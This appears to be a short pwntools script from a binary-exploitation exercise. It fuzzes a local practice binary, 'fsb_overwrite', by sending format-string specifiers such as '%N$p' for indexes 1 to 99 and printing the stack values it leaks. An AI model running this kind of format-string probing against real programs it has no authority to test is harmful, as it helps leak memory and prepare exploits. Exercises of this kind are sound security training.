from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./fsb_overwrite', checksec=False)

# Let's fuzz 100 values
for i in range(1,100):
    try:
        p = process(level='error')
        p.sendline('%{}$p'.format(i).encode())
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except ValueError:
        pass